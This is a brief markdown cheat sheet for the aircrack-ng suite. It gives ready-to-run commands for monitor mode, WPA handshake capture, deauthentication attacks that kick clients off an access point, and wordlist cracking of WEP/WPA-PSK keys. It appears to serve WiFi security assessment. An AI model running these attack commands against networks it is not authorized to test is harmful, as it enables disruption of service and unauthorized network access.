---
title: AIRCRACK-NG
summary: A complete suite of tools to assess WiFi network security.
description: A complete suite of tools to assess WiFi network security.
---

**[https://github.com/aircrack-ng/aircrack-ng](https://github.com/aircrack-ng/aircrack-ng)**

## AIRCRACK-NG Monitor Mode


 > 
 > **<font color=red>airmon-ng check kill</font>**</br>
 > Kill processes that interfere with monitor mode.

 > 
 > **<font color=red>airmon-ng start</font> wlan0**</br>
 > Start monitor mode on wlan0 interface.

## AIRCRACK-NG Capture


 > 
 > **<font color=red>airodump-ng </font>wlan0mon**</br>
 > Listen for APs around.

 > 
 > **<font color=red>airodump-ng --channel</font> 6 <font color=red>--bssid</font> AP:MAC <font color=red>-w capture</font> wlan0mon**</br>
 > Capture traffic from an AP. Need to wait for WPA handshake in the top right.
 > Can use Deauth attack to speed up the process.

## AIRCRACK-NG Deauth Attack


 > 
 > **<font color=red>aireplay-ng -0 1 -a </font>AP:MAC <font color=red>-c</font> CLIENT:MAC wlan0mon**</br>
 > Deauth attack (kick the client off the AP really quick).

 > 
 > **<font color=red>-0</font> 1**</br>
 > Deauth, one time.
 > 
 > **<font color=red>-c</font>**</br>
 > Client to deauthenticate.

## AIRCRACK-NG Crack WEP, WPA-PSK


 > 
 > **<font color=red>aircrack-ng -a </font>WEP myCapture.cap**</br>
 > **<font color=red>aircrack-ng -w </font>wordlist.txt <font color=red>-b</font> AP:MAC myCaptureFromAirodump**</br>

 > 
 > **<font color=red>-a</font> WEP**</br>
 > Attack Mode: WEP (Need  > 5000 IV) or WPA-PSK.
 > 
 > **<font color=red>-e</font> mySSID**</br>
 > Specifies SSID.
 > 
 > **<font color=red>-n </font>64**</br>
 > Size of the key (64, 128, 152, 256, 512).
